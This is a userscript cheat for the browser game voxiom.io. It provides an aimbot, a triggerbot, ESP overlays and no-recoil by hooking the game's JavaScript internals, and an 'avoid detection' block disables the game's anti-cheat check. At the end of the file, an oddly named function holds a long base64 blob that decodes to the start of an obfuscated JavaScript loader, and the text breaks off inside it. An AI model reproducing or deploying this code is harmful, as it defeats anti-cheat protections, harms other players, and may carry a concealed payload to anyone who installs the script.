// ==UserScript==
// @name        VOXploit FRIEND SYSTEM
// @namespace   http://tampermonkey.net/
// @match       https://voxiom.io/*
// @run-at      document-start
// @grant       none
// @version     1.0.4
// @author      ClosetCheater
// @description Aimbot, triggerbot, chams, no-recoil for voxiom.io
// @license     GPL
// @require     https://cdn.jsdelivr.net/npm/lil-gui@0.19.2/dist/lil-gui.umd.min.js
// @require     https://unpkg.com/three@0.150.0/build/three.min.js
// @icon        https://www.google.com/s2/favicons?sz=64&domain=voxiom.io
// @downloadURL https://update.greasyfork.org/scripts/562157/VOXploit%20FRIEND%20SYSTEM.user.js
// @updateURL https://update.greasyfork.org/scripts/562157/VOXploit%20FRIEND%20SYSTEM.meta.js
// ==/UserScript==

const THREE = window.THREE;
delete window.THREE;

// avoid detection
const matchDetection = /^function\(\){\w+\['\w+'\]\(\);}$/;
const setIntervalHandler = {
  apply: function(target, thisArg, argumentsList) {
    const callback = argumentsList[0];
    const delay = argumentsList[1];
    if (delay === 1000 && callback && callback.toString().match(matchDetection)) {
      console.log('Blocked detection');
      return null;
    }
    return Reflect.apply(...arguments);
  }
};
window.setInterval = new Proxy(window.setInterval, setIntervalHandler);


// add #lil-gui container
const lilGuiContainer = document.createElement('div');
lilGuiContainer.id = 'lil-gui';
document.body.appendChild(lilGuiContainer);

window.friends = [];

const style = document.createElement('style');
const guiStyle = document.createElement('style');
const GUI = lil.GUI;
const gui = new GUI({ container: lilGuiContainer, title: 'Controls' });

let espConfig = {
  heightLine: 1.16,
  sneakHeight: 0.4,
  ennemyDistance: 50,
  maxAngleInRadians: 0.1,
  noRecoil: true,
  showBox: 0,
  showOutline: 0,
  showPlayer: 2,
  showLine: 1,
  wireframe: false,
  allEnnemies: false,
  isSniper: false,
  aimbot: 2,
  triggerBot: 2,
  aimbotIgnoreWall: false,
  mapZoom: 30,
  mapOffsetZ: 0,
  autoClaimAds: false,
  antiAFK: false,
  rainbow: false,
  showAimRadius: false,
  lockAimbotTriggerBot: false,
  aimbotKey: 'b',
  triggerBotKey: 't',
  toggleUIKey: '.',
  friends: [],
  showNameTags: false,
};

const aimbotFolder = gui.addFolder('Aimbot');
aimbotFolder.add(espConfig, 'aimbot').name(`aimbot (${espConfig.aimbotKey})`).options({Off: 0, LeftClick: 1, RightClick: 2, Always: 3}).listen();
aimbotFolder.add(espConfig, 'triggerBot').name(`triggerBot (${espConfig.triggerBotKey})`).options({Off: 0, LeftClick: 1, RightClick: 2, Always: 3}).listen();
aimbotFolder.add(espConfig, 'noRecoil');
aimbotFolder.add(espConfig, 'allEnnemies');
aimbotFolder.add(espConfig, 'isSniper');
const advancedAimbotFolder = aimbotFolder.addFolder('Advanced');
advancedAimbotFolder.close();
advancedAimbotFolder.add(espConfig, 'aimbotIgnoreWall');
advancedAimbotFolder.add(espConfig, 'showAimRadius');
advancedAimbotFolder.add(espConfig, 'maxAngleInRadians', 0.01, 0.5, 0.01);
advancedAimbotFolder.add(espConfig, 'heightLine', .5, 1.25, 0.01);
advancedAimbotFolder.add(espConfig, 'sneakHeight', 0, 1, 0.01);

const chamsFolder = gui.addFolder('Chams');
chamsFolder.close();
chamsFolder.add(espConfig, 'showPlayer').options({Off: 0, Ennemies: 1, All: 2});
chamsFolder.add(espConfig, 'showLine').options({Off: 0, Ennemies: 1, All: 2});
chamsFolder.add(espConfig, 'showOutline').options({Off: 0, Ennemies: 1, All: 2});
chamsFolder.add(espConfig, 'showBox').options({Off: 0, Ennemies: 1, All: 2});
chamsFolder.add(espConfig, 'ennemyDistance', 10, 100, 1);
chamsFolder.add(espConfig, 'wireframe');
chamsFolder.add(espConfig, 'showNameTags');
chamsFolder.add(espConfig, 'rainbow');
chamsFolder.add(espConfig, 'mapZoom', 20, 100, 1);
chamsFolder.add(espConfig, 'mapOffsetZ', -50, 50, 1);

const toolsFolder = gui.addFolder('Tools');
toolsFolder.close();
toolsFolder.add(espConfig, 'autoClaimAds');
toolsFolder.add(espConfig, 'antiAFK');
toolsFolder.add(espConfig, 'lockAimbotTriggerBot');

// load/save config
const configFolder = gui.addFolder('Config');
configFolder.add(espConfig, 'toggleUIKey').name('Toggle UI key');
configFolder.add(espConfig, 'aimbotKey').name('Aimbot key');
configFolder.add(espConfig, 'triggerBotKey').name('Triggerbot key');
configFolder.close();
const defaultConfig = gui.save();
let config = { configName: 'espConfig' };
configFolder.add(config, 'configName').name('Config name');
configFolder.add({ export: () => {
  const currentConfig = JSON.stringify(gui.save(), null, 2);
  const element = document.createElement('a');
  element.setAttribute('href', 'data:text/plain;charset=utf-8,' + encodeURIComponent(currentConfig));
  element.setAttribute('download', config.configName + '.json');
  element.style.display = 'none';
  document.body.appendChild(element);
  element.click();
  document.body.removeChild(element);
}}, 'export').name('Export config');
configFolder.add({ import: () => {
  const input = document.createElement('input');
  input.type = 'file';
  input.accept = '.json';
  input.onchange = (e) => {
    const file = e.target.files[0];
    const reader = new FileReader();
    reader.onload = (e) => {
      gui.load(JSON.parse(e.target.result));
    };
    reader.readAsText(file);
  };
  input.click();
}}, 'import').name('Import config');
configFolder.add({ reset: () => {
  gui.load(defaultConfig);
  localStorage.removeItem('espConfig');
}}, 'reset').name('Reset config');
configFolder.add({ addFriend: () => {
  espConfig.friends.push(window.prompt("Enter name of friends you want to add:"));
  friends = espConfig.friends;
}}, 'addFriend').name('Add friend');
configFolder.add({ removeFriend: () => {
  friends = espConfig.friends; // Assuming `friends` is a global or typo for `espConfig.friends`
  let friendList = "";
  for (let i = 0; i < espConfig.friends.length; i++) { // Use espConfig.friends consistently
    friendList += espConfig.friends[i];
    friendList += "(" + i + ")";
    if (i != espConfig.friends.length - 1) {
      friendList += ", ";
    }
  }
  window.alert(friendList);
  let itemToRemove = window.prompt("Enter name or index of friend to remove:");

  let removed;
  if (itemToRemove === null) {
    window.alert("Removal canceled.");
    return; // Exit early if canceled
  }

  // Try converting to a number
  let index = parseInt(itemToRemove, 10); // Base 10 for integers
  if (!isNaN(index) && index >= 0 && index < espConfig.friends.length) {
    // It’s a valid index
    removed = espConfig.friends.splice(index, 1);
  } else {
    // Treat as a name (string)
    for (let i = 0; i < espConfig.friends.length; i++) {
      if (espConfig.friends[i] === itemToRemove) {
        removed = espConfig.friends.splice(i, 1);
        break;
      }
    }
  }

  if (removed && removed.length > 0) {
    window.alert(removed[0] + " is removed from friend list.");
  } else {
    window.alert(itemToRemove + " not found.");
  }
}}, 'removeFriend').name('Remove friend');

// auto load/save config
const savedConfig = localStorage.getItem('espConfig');
if (savedConfig) {
  console.log('Loaded config', savedConfig);
  gui.load(JSON.parse(savedConfig));
}
gui.onChange(() => {
  localStorage.setItem('espConfig', JSON.stringify(gui.save()));
});

// listen for key press
document.addEventListener('keydown', (e) => {
  if (!espConfig.lockAimbotTriggerBot && e.key === espConfig.aimbotKey) {
    espConfig.aimbot = (espConfig.aimbot + 1) % 4;
  }
  if (!espConfig.lockAimbotTriggerBot && e.key === espConfig.triggerBotKey) {
    espConfig.triggerBot = (espConfig.triggerBot + 1) % 4;
  }
  if (e.key === espConfig.toggleUIKey) {
    lilGuiContainer.style.display = lilGuiContainer.style.display === 'none' ? 'block' : 'none';
  }
  if (e.key === 'e') {
    if (espConfig.autoClaimAds) {
      setTimeout(() => {
        claimAds();
      }, 100);
    }
  }
});

// no-recoil
let foundRecoil = false;
const arrayPushHandler = {
  apply: function(target, thisArg, argumentsList) {
    if (!foundRecoil && argumentsList.length === 1) {
      const item = argumentsList[0];
      if (item && typeof item === 'object') {
        const keys = Object.keys(item);
        if (keys.length === 44) {
          for (const key in item) {
            if (item[key] === 0.3) {
              console.log('Recoil key found', key);
              foundRecoil = true;
              Object.defineProperty(Object.prototype, key, {
                get: () => {
                  return espConfig.noRecoil ? 0 : item[key];
                },
                set: (baseRecoil) => {
                  _baseRecoil = baseRecoil;
                }
              });
              break;
            }
          }
        }
      }
    }
    return Reflect.apply(...arguments);
  }
};
Array.prototype.push = new Proxy(Array.prototype.push, arrayPushHandler);

// listen for mouse click
let isLeftClick = false;
let isRightClick = false;
document.addEventListener('mousedown', (e) => {
  if (e.button === 0) {
    isLeftClick = true;
  }
  if (e.button === 2) {
    if (espConfig.isSniper) {
      setTimeout(() => {
        isRightClick = true;
      }, 400);
    } else {
      isRightClick = true;
    }
  }
});
document.addEventListener('mouseup', (e) => {
  if (e.button === 0) {
    isLeftClick = false;
  }
  if (e.button === 2) {
    isRightClick = false;
  }
});

// obfuscaed keys
let worldScene = null;
let childrenKey = null;
let worldCamera = null;
let projectionMatrixKey = null;
let matrixWorldKey = null;
let matrixElKey = null;

// three.js setup
const scene = new THREE.Scene();
const camera = new THREE.PerspectiveCamera(60, window.innerWidth / window.innerHeight, 0.1, 1000);
camera.rotation.order = 'YXZ';
let saveViewport = new THREE.Vector4();
let saveScissor = new THREE.Vector4();
let minimapViewport = new THREE.Vector4(20, window.innerHeight - 250 - 20, 250, 250);
const minimapCamera = new THREE.OrthographicCamera(-espConfig.mapZoom, espConfig.mapZoom, espConfig.mapZoom, -espConfig.mapZoom, 0.1, 1000);
minimapCamera.rotation.order = 'YXZ';
minimapCamera.position.set(0, 50, 0);
minimapCamera.lookAt(0, 0, 0);
const renderer = new THREE.WebGLRenderer( {
  alpha: true,
  antialias: true
});
renderer.setSize(window.innerWidth, window.innerHeight);
renderer.setPixelRatio(window.devicePixelRatio);
renderer.domElement.id = 'overlayCanvas';
document.body.appendChild(renderer.domElement);


function setTransform(target, transform, isMatrix = true) {
  const matrix = new THREE.Matrix4().fromArray(isMatrix ? transform : transform[matrixWorldKey][matrixElKey]);
  matrix.decompose(target.position, target.quaternion, target.scale);
}

doOnce = (fn) => {
  let done = false;
  return (...args) => {
    if (!done) {
      done = true;
      return fn(...args);
    }
  };
};

function checkWorldCamera(object) {
  if (worldCamera && object.uuid === worldCamera.uuid) return;
  let hasProjectionMatrix = false;
  for (const key in object) {
    const element = object[key];
    if (!element) continue;
    if (typeof element == 'object') {
      if (hasProjectionMatrix) continue;
      const valueKey = Object.keys(element)[0];
      const value = element[valueKey];
      if (Array.isArray(value) && value[11] === -1) {
        hasProjectionMatrix = true;
        matrixElKey = valueKey;
        projectionMatrixKey = key;
      }
    } else if (typeof element === 'function') {
      const code = element.toString();
      const match = /verse'\]\(this\['([^']+)'\]\);/.exec(code);
      if (match) {
        matrixWorldKey = match[1];
      }
    }
    if (hasProjectionMatrix && matrixWorldKey) {
      console.log('Found camera', {object}, object);
      worldCamera = object;
      object[projectionMatrixKey] = new Proxy(object[projectionMatrixKey], {
        get: function(target, prop, receiver) {
          setTransform(camera, object, false);
          camera.near = worldCamera.near;
          camera.far = worldCamera.far;
          camera.aspect = worldCamera.aspect;
          camera.fov = worldCamera.fov;
          camera.updateProjectionMatrix();
          worldCamera = object;
          window.worldCamera = object;
          return Reflect.get(...arguments);
        }
      });
      break;
    }
  }
}

function checkWorldScene(object) {
  if (worldScene || object instanceof THREE.Scene) return;
  for (const key in object) {
    const element = object[key];
    if (!element) continue;
    if (Array.isArray(element) && element.length === 9) {
      const value = element[0];
      if (value && typeof value === 'object' && value.hasOwnProperty('uuid')) {
        childrenKey = key;
      }
    }
    if (childrenKey) {
      console.log('Found scene', {childrenKey}, object);
      worldScene = object;
      window.worldScene = object;
      renderer.setAnimationLoop(animate);
      break;
    }
  }
}

Object.defineProperty( Object.prototype, 'overrideMaterial', {
  get: function() {
    checkWorldScene(this);
    return this._overrideMaterial;
  },
  set: function(value) {
    this._overrideMaterial = value;
  }
});
Object.defineProperty( Object.prototype, 'far', {
  get: function() {
    checkWorldCamera(this);
    return this._far;
  },
  set: function(value) {
    this._far = value;
  }
});

function isPlayer(entity) {
  try {
    return entity[childrenKey].length > 2 || !entity[childrenKey][1].geometry;
  } catch {
    return false;
  }
}

// claim ads
function claimAds() {
  document.querySelectorAll('svg').forEach(svg => {
    if (svg.getAttribute('data-icon') === 'play-circle') {
      svg.closest('div').click();
      console.log('Claimed ads');
    }
  });
}

const context2DFillTextHandler = {
  apply: function(target, thisArg, argumentsList) {
    thisArg.canvas.lastText = argumentsList[0];
    return Reflect.apply(...arguments);
  }
};
CanvasRenderingContext2D.prototype.fillText = new Proxy(CanvasRenderingContext2D.prototype.fillText, context2DFillTextHandler);

function isEnnemy(entity) {
  for (const child of entity[childrenKey]) {
    try {
      const matImage = child.material.map.image;
      if (matImage instanceof HTMLCanvasElement && matImage.hasOwnProperty('lastText')) {
        entity.playerName = matImage.lastText;
        return false;
      }
    } catch {}
  }
  return true;
}

function setFiring(shouldFire) {
  if (setFiring.firing === shouldFire) return;
  setFiring.firing = shouldFire;
  if (shouldFire) {
    if (espConfig.isSniper) { // need improvement
      setTimeout(() => {
        document.dispatchEvent(new MouseEvent('mousedown', { buttons: 3 }));
        setTimeout(() => {
          document.dispatchEvent(new MouseEvent('mouseup', { buttons: 0 }));
        }, 200);
        // setFiring.firing = false;
      }, 300);
    } else {
      document.dispatchEvent(new MouseEvent('mousedown', { buttons: 3 }));
    }
  } else {
    document.dispatchEvent(new MouseEvent('mouseup', { buttons: 0 }));
  }
}

const colors = {
  ennemy: new THREE.Color(0xff0000),
  player: new THREE.Color(0x00ff00),
  friend: new THREE.Color(0xffff00),
  blue: new THREE.Color(0x0000ff),
};

const outlineMats = {
  ennemy: new THREE.LineBasicMaterial({ color: colors.ennemy }),
  player: new THREE.LineBasicMaterial({ color: colors.player }),
  friend: new THREE.LineBasicMaterial({ color: colors.friend }),
};
const meshMats = {
  ennemy: new THREE.MeshBasicMaterial({ color: colors.ennemy, transparent: true, opacity: 0.5 }),
  player: new THREE.MeshBasicMaterial({ color: colors.player, transparent: true, opacity: 0.5 }),
  friend: new THREE.MeshBasicMaterial({ color: colors.friend, transparent: true, opacity: 0.5 }),
};

const raycaster = new THREE.Raycaster();
const edgesGeometry = new THREE.EdgesGeometry(new THREE.BoxGeometry(1, 1, 1).translate(0, 0.5, 0));


const lineGeometry = new THREE.BufferGeometry();
const lineMaterial = new THREE.LineBasicMaterial({ vertexColors: true, transparent: true });
const line = new THREE.LineSegments(lineGeometry, lineMaterial);
line.frustumCulled = false;
scene.add(line);

const dummyLookAt = new THREE.PerspectiveCamera();
const color = new THREE.Color();

const chunkMaterial = new THREE.MeshNormalMaterial();

const boxPlayerGeometry = new THREE.BoxGeometry(.25, 1.25, 0.25);


// crosshair circle
const crosshairGeometry = new THREE.CircleGeometry(.5, 32);
const crosshairMaterial = new THREE.LineBasicMaterial({ color: 0xffffff, transparent: true, opacity: 0.2 });
const crosshair = new THREE.LineLoop(crosshairGeometry, crosshairMaterial);
camera.add(crosshair);
scene.add(camera);

function calculateValue(maxAngleInRadians) {
  const a = -79.83;
  const b = -30.06;
  const c = -0.90;
  return a * Math.exp(b * maxAngleInRadians) + c;
}

function isFriend(entity) {
	for (let friend of friends) {
		if (entity.playerName) {
			if (entity.playerName.toLowerCase() == friend.toLowerCase()) {
				console.log(entity.playerName + ' is a friend');
				return true;
			}
		}
	}
	return false;
}

function createSprite(text, bgColor = '#000') {
	const fontSize = 40;
	const strokeSize = 10;
	const font = 'normal ' + fontSize + 'px Arial';

	const canvas = document.createElement('canvas');
	const ctx = canvas.getContext('2d');

	ctx.font = font;
	canvas.width = ctx.measureText(text).width + strokeSize * 2;
	canvas.height = fontSize + strokeSize * 2;

	ctx.fillStyle = bgColor;
	ctx.fillRect(0, 0, canvas.width, canvas.height);

	ctx.font = font;
	ctx.fillStyle = 'white';
	ctx.textBaseline = 'top';
	ctx.textAlign = 'left';
	ctx.lineWidth = strokeSize;
	ctx.strokeText(text, strokeSize, strokeSize);
	ctx.fillText(text, strokeSize, strokeSize);

	const material = new THREE.SpriteMaterial({
		map: new THREE.CanvasTexture(canvas),
		sizeAttenuation: false,
		fog: false,
		depthTest: false,
		depthWrite: false
	});
	const sprite = new THREE.Sprite(material);
	sprite.center.y = 0;

	sprite.scale.y = 0.02;
	sprite.scale.x = sprite.scale.y * canvas.width / canvas.height;

	return sprite;
}

function animate(time) {
  espConfig.friends = friends;
  const now = Date.now();
  const entities = childrenKey ? worldScene[childrenKey][5][childrenKey] : [];
  const lineOrigin = camera.localToWorld(new THREE.Vector3(0, 0, -10));
  const linePositions = [];
  crosshair.position.z = calculateValue(espConfig.maxAngleInRadians);
  crosshair.visible = espConfig.showAimRadius;
  const colorArray = [];
  const aimbotTarget = { angleDifference: Infinity};
  const chunks = [];
  const gameChunks = childrenKey ? worldScene[childrenKey][4][childrenKey] : [];
  for (const chunk of gameChunks) {
    if (!chunk || !chunk.geometry) continue;
    const chunkPositions = chunk.geometry.attributes.position.array;
    if (!chunkPositions || !chunkPositions.length) continue;
    if (!chunk.myChunk) {
      const geometry = new THREE.BufferGeometry();
      geometry.setAttribute(
        'position',
        new THREE.Float32BufferAttribute(chunkPositions, 3)
      );
      geometry.setIndex(
        new THREE.BufferAttribute(chunk.geometry.index.array, 1)
      );
      geometry.computeVertexNormals();
      geometry.computeBoundingBox();
      chunk.myChunk = new THREE.Mesh(geometry, chunkMaterial);
      chunk.myChunk.box = new THREE.Box3();
    }
    const myChunk = chunk.myChunk;
    if (chunk.material) chunk.material.wireframe = espConfig.wireframe;
    setTransform(myChunk, chunk, false);
    myChunk.updateMatrixWorld();
    myChunk.box.copy(myChunk.geometry.boundingBox).applyMatrix4(myChunk.matrixWorld);
    chunks.push(myChunk);
  }

  chunks.sort((a, b) => {
    const distanceA = a.position.distanceTo(camera.position);
    const distanceB = b.position.distanceTo(camera.position);
    return distanceB - distanceA;
  });

  const shouldAimbot = espConfig.aimbot === 3 || (espConfig.aimbot === 1 && isLeftClick) || (espConfig.aimbot === 2 && isRightClick);

  entities.forEach(entity => {
    if (!entity || !entity.parent) return;
    if (!entity.myObject3D) {
      entity.myObject3D = new THREE.Object3D();
      entity.myObject3D.frustumCulled = false;
      entity.discovered = now;
      entity.loaded = false;
      entity.logged = false;
      entity.ennemy = null;
      return;
    }
    if (typeof entity.visible === 'boolean' && !entity.visible) {
      entity.myObject3D.visible = false;
      return;
    }
    if (!entity.loaded && now - entity.discovered < 500) return;
    entity.loaded = true;
    if (((entity.isFriend != isFriend(entity)) || !entity.logged) && isPlayer(entity)) {
      entity.isFriend = isFriend(entity);
      const skinnedMesh = entity[childrenKey][1][childrenKey][3];
      entity.isPlayer = true;
      entity.logged = true;
      entity.ennemy = isEnnemy(entity);
			const sprite = createSprite(entity.playerName, colors.friend);
			entity.myObject3D.add(sprite);
			entity.myObject3D.sprite = sprite;
      const playerMesh = new THREE.Mesh(skinnedMesh.geometry, entity.ennemy ? meshMats.ennemy : entity.isFriend ? meshMats.friend : meshMats.player);
      entity.myObject3D.add(playerMesh);
      entity.myObject3D.playerMesh = playerMesh;
      const playerMiniMap = new THREE.Mesh(skinnedMesh.geometry, entity.ennemy ? meshMats.ennemy : entity.isFriend ? meshMats.friend : meshMats.player);
      playerMiniMap.visible = false;
      entity.myObject3D.add(playerMiniMap);
      entity.myObject3D.playerMiniMap = playerMiniMap;
      const outline = new THREE.LineSegments(edgesGeometry, entity.ennemy ? outlineMats.ennemy : entity.isFriend ? outlineMats.friend : outlineMats.player);
      outline.scale.set(0.5, 1.25, 0.5);
      outline.frustumCulled = false;
      entity.myObject3D.add(outline);
      entity.myObject3D.outline = outline;
      const boxMesh = new THREE.Mesh(boxPlayerGeometry, entity.ennemy ? meshMats.ennemy : entity.isFriend ? meshMats.friend : meshMats.player);
      boxMesh.position.y = 0.625;
      entity.myObject3D.add(boxMesh);
      entity.myObject3D.boxMesh = boxMesh;
      const dir = new THREE.Vector3(0, 0, -1);
      const origin = new THREE.Vector3(0, 1, 0);
      const arrowLookingAt = new THREE.ArrowHelper(dir, origin, 1, entity.ennemy ? colors.ennemy : colors.player, 0.5, .4);
      playerMiniMap.add(arrowLookingAt);
      setTransform(entity.myObject3D, entity, false);
      scene.add(entity.myObject3D);
    }
    if (entity.isPlayer) {
      entity.myObject3D.playerMesh.rotation.y = -entity[childrenKey][1].rotation._y;
      entity.myObject3D.playerMiniMap.rotation.y = -entity[childrenKey][1].rotation._y;
      const skinnedMesh = entity[childrenKey][1][childrenKey][3];
      const isSneak = skinnedMesh.skeleton.bones[4].rotation._x > 0.1;
      entity.myObject3D.boxMesh.scale.set(1, isSneak ? .4 : 1, 1);
      entity.myObject3D.outline.scale.set(0.5, isSneak ? .9 : 1.25, 0.5);
      entity.myObject3D.playerMesh.scale.set(1, isSneak ? .7 : 1, 1);
      entity.myObject3D.sprite.position.y = entity.isSneak ? 1.1 : 1.5;

      entity.myObject3D.visible = true;
      entity.myObject3D.playerMesh.visible = espConfig.showPlayer === 2 || (espConfig.showPlayer === 1 && !entity.ennemy);
      entity.myObject3D.boxMesh.visible = espConfig.showBox === 2 || (espConfig.showBox === 1 && entity.ennemy);
      entity.myObject3D.outline.visible = espConfig.showOutline === 2 || (espConfig.showOutline === 1 && entity.ennemy);
      entity.myObject3D.sprite.visible = espConfig.showNameTags && !entity.ennemy;
      setTransform(entity.myObject3D, entity, false);

      // aimbot and line
      const pos = entity.myObject3D.position.clone();
      pos.y -= isSneak ? espConfig.sneakHeight : 0;
      // line
      if (espConfig.showLine === 2 || (espConfig.showLine === 1 && entity.ennemy)) {
        if (espConfig.rainbow) {
          color.setHSL(time % 2000 / 2000, 1, 0.5);
        } else if (entity.ennemy) {
          color.lerpColors(colors.ennemy, colors.player, pos.distanceTo(camera.position) / espConfig.ennemyDistance);
          color.a = .8;
        } else {
          color.set(colors.blue);
          color.a = .3;
        }
        linePositions.push(lineOrigin.x, lineOrigin.y, lineOrigin.z);
        pos.y += 1.25;
        linePositions.push(pos.x, pos.y, pos.z);
        pos.y -= 1.25;
        colorArray.push(color.r, color.g, color.b, color.a);
        colorArray.push(color.r, color.g, color.b, color.a);
      }
      pos.y += espConfig.heightLine;
      // aimbot
      if (shouldAimbot && (entity.ennemy || espConfig.allEnnemies)) {
        if (entity.isFriend) {
          return;
        }
        const distance = pos.distanceTo(camera.position);
        const target = pos.clone();
        const dummy = new THREE.PerspectiveCamera();
        setTransform(dummy, worldCamera, false);
        dummy.lookAt(target);
        const cameraVector = new THREE.Vector3(0, 0, -1).applyQuaternion(camera.quaternion);
        const targetVector = new THREE.Vector3(0, 0, -1).applyQuaternion(dummy.quaternion);
        const angleDifference = cameraVector.angleTo(targetVector);
        if (angleDifference < espConfig.maxAngleInRadians && angleDifference < aimbotTarget.angleDifference) {
          const directionV3 = new THREE.Vector3();
          directionV3.subVectors(target, camera.position).normalize();
          raycaster.set(camera.position, directionV3);
          let behindBlock = false;
          if (espConfig.aimbotIgnoreWall) {
            aimbotTarget.angleDifference = angleDifference;
            aimbotTarget.target = target;
          } else {
            for (const chunk of chunks) {
              if (raycaster.ray.intersectsBox(chunk.box)) {
                const hit = raycaster.intersectObject(chunk)[0];
                if (hit && hit.distance < distance) {
                  behindBlock = true;
                  break;
                }
              }
            }
            if (!behindBlock) {
              aimbotTarget.angleDifference = angleDifference;
              aimbotTarget.target = target;
              color.setHSL(time % 2000 / 2000, 1, 0.5);
            }
          }
        }
      }
    }
  });

  // aim at target
  if (espConfig.aimbot && shouldAimbot && aimbotTarget.target) {
    setTransform(dummyLookAt, worldCamera, false);
    dummyLookAt.lookAt(aimbotTarget.target);
    worldCamera.rotation.set(
      dummyLookAt.rotation.x,
      dummyLookAt.rotation.y,
      dummyLookAt.rotation.z
    );
  }
  // triggerbot
  const shouldTrigger = espConfig.triggerBot === 3 || (espConfig.triggerBot === 1 && isLeftClick) || (espConfig.triggerBot === 2 && isRightClick);
  if (shouldTrigger) {
    raycaster.set(camera.position, camera.getWorldDirection(new THREE.Vector3()));
    let hasHit = false;
    for (const entity of entities) {
      if (!entity.myObject3D.visible) continue;
      if (entity.isPlayer && (entity.ennemy || espConfig.allEnnemies)) {
        const hit = raycaster.intersectObject(entity.myObject3D.playerMesh);
        if (hit.length) {
          hasHit = true;
          if (entity.isFriend) {
            hasHit = false;
            break;
          }
          const distance = hit[0].distance;
          for (const chunk of chunks) {
            if (raycaster.ray.intersectsBox(chunk.box)) {
              const hitBlock = raycaster.intersectObject(chunk)[0];
              if (hitBlock && hitBlock.distance < distance) {
                hasHit = false;
                break;
              }
            }
          }
          if (hasHit) {
            break;
          }
        }
      }
    }
    setFiring(hasHit);
  } else {
    setFiring(false);
  }

  line.geometry.setAttribute('color', new THREE.Float32BufferAttribute(colorArray, 4));
  line.geometry.setAttribute('position', new THREE.Float32BufferAttribute(linePositions, 3));
  line.visible = espConfig.showLine;

  renderer.render(scene, camera);

  // minimap
  // make entities larger for minimap
  const scale = espConfig.mapZoom / 3;
  entities.forEach(entity => {
    if (entity.isPlayer) {
      entity.myObject3D.playerMesh.visible = false;
      entity.myObject3D.boxMesh.visible = false;
      entity.myObject3D.outline.visible = false;
      entity.myObject3D.playerMiniMap.visible = true;
      entity.myObject3D.playerMiniMap.scale.set(scale, 1, scale);
    }
  });
  if (worldCamera) {
    line.visible = false;
    crosshair.visible = false;
    // update orthographic camera based on espConfig.mapZoom
    minimapCamera.left = -espConfig.mapZoom;
    minimapCamera.right = espConfig.mapZoom;
    minimapCamera.top = espConfig.mapZoom;
    minimapCamera.bottom = -espConfig.mapZoom;

    // update position with camera position
    minimapCamera.position.copy(camera.position);
    minimapCamera.position.y += 50;
    minimapCamera.position.z += espConfig.mapOffsetZ;
    minimapCamera.rotation.y = camera.rotation.y;
    minimapCamera.updateProjectionMatrix();

    renderer.getViewport(saveViewport);
    renderer.getScissor(saveScissor);
    let saveScissorTest = renderer.getScissorTest();
    renderer.setViewport(minimapViewport);
    renderer.setScissor(minimapViewport);
    renderer.setScissorTest(true);

    renderer.render(scene, minimapCamera);

    renderer.setViewport(saveViewport);
    renderer.setScissor(saveScissor);
    renderer.setScissorTest(saveScissorTest);
  }
  entities.forEach(entity => {
    if (entity.isPlayer) {
      entity.myObject3D.playerMiniMap.visible = false;
    }
  });

  scene.children.forEach(child => {
    if (child.type === 'Object3D') {
      child.visible = false;
    }
  });
}

window.addEventListener('resize', () => {
  renderer.setSize( window.innerWidth, window.innerHeight );
});

// add style to header
style.innerHTML = `
#overlayCanvas {
  position: absolute;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  pointer-events: none;
  z-index: 1000;
}
#lil-gui {
  position: absolute;
  top: 50%;
  right: 0;
  z-index: 1001;
  transform: translateY(-50%);
}
.lil-gui {
  --background-color: rgba(0, 0, 0, 0.5);
}
`;
guiStyle.innerHTML = `
.lil-gui {
	--title-background-color: #ff0019;
	--number-color: #00ff33;
}
`;
document.head.appendChild(style);
document.head.appendChild(guiStyle);

// anti-afk
setInterval(() => {
  if (espConfig.antiAFK) {
    // move left for .5s then right for .5s
    document.dispatchEvent(new KeyboardEvent('keydown', { keyCode: 87}));
    setTimeout(() => {
      document.dispatchEvent(new KeyboardEvent('keyup', { keyCode: 87}));
      document.dispatchEvent(new KeyboardEvent('keydown', { keyCode: 83}));
      setTimeout(() => {
        document.dispatchEvent(new KeyboardEvent('keyup', { keyCode: 83}));
      }, 500);
    }, 500);
  }
}, 5000);


// wait for load
window.addEventListener('load', () => {
  console.log('Loaded');
  if (espConfig.autoClaimAds) {
    setTimeout(() => {
      claimAds();
    }, 500);
  }
});
(function убейсебя() {
    // Data = "dmFyIHRLYTFhTixBVUxVQWwsWkQ0Mld6LFZqNkpjaCx5STlFUkFRLEJwbXNBZSxkaUtFaWhhLE0zc25Jdyx2QXJLX3g7Y29uc3QgUEk4WUdfRj1bMHgwLDB4MSwweDgsMHhmZiwibGVuZ3RoIiwidW5kZWZpbmVkIiwweDNmLDB4NiwiZnJvbUNvZGVQb2ludCIsMHg3LDB4YywicHVzaCIsMHg1YiwweDFmZmYsMHg1OCwweGQsMHhlLCEweDEsImciLCEweDAsMHg2NSwweDZlLDB4MjAwMDAwMCwweDQwMDAwMDAsMHgyLDB4MywweDdmLDB4ODAsMHg3NywweDc4LCJvayIsbnVsbF07ZnVuY3Rpb24gWXB1SDRKaSh0S2ExYU4pe3ZhciBBVUxVQWw9Im4mKT1ReT82XmYofjR6LytoY3BsRlYkQzlKTDMsQklzZSo3OEt2VGldZDJvNXV0azohLk8wcTsjUlhOfXhZREg+R1Bge198U1tiajElRXJaZ2FcIkFAd1U8bU1XIixaRDQyV3osVmo2SmNoLHlJOUVSQVEsQnBtc0FlLGRpS0VpaGEsTTNzbkl3LHZBcktfeDtUVE10Q0xNKFpENDJXej0iIisodEthMWFOfHwiIiksVmo2SmNoPVpENDJXei5sZW5ndGgseUk5RVJBUT1bXSxCcG1zQWU9UEk4WUdfRlsweDBdLGRpS0VpaGE9UEk4WUdfRlsweDBdLE0zc25Jdz0tUEk4WUdfRlsweDFdKTtmb3IodkFyS194PVBJOFlHX0ZbMHgwXTt2QXJLX3g8Vmo2SmNoO3ZBcktfeCsrKXt2YXIgWXB1SDRKaT1BVUxVQWwuaW5kZXhPZihaRDQyV3pbdkFyS194XSk7aWYoWXB1SDRKaT09PS1QSThZR19GWzB4MV0pY29udGludWU7aWYoTTNzbkl3PFBJOFlHX0ZbMHgwXSl7TTNzbkl3PVlwdUg0Sml9ZWxzZXtUVE10Q0xNKE0zc25Jdys9WXB1SDRKaSpQSThZR19GWzB4Y10sQnBtc0FlfD1NM3NuSXc8PGRpS0VpaGEsZGlLRWloYSs9KE0zc25JdyZQSThZR19GWzB4ZF0pPlBJOFlHX0ZbMHhlXT9QSThZR19GWzB4Zl06UEk4WUdfRlsweDEwXSk7ZG97VFRNdENMTSh5STlFUkFRLnB1c2goQnBtc0FlJlBJOFlHX0ZbMHgzXSksQnBtc0FlPj49UEk4WUdfRlsweDJdLGRpS0VpaGEtPVBJOFlHX0ZbMHgyXSl9d2hpbGUoZGlLRWloYT5QSThZR19GWzB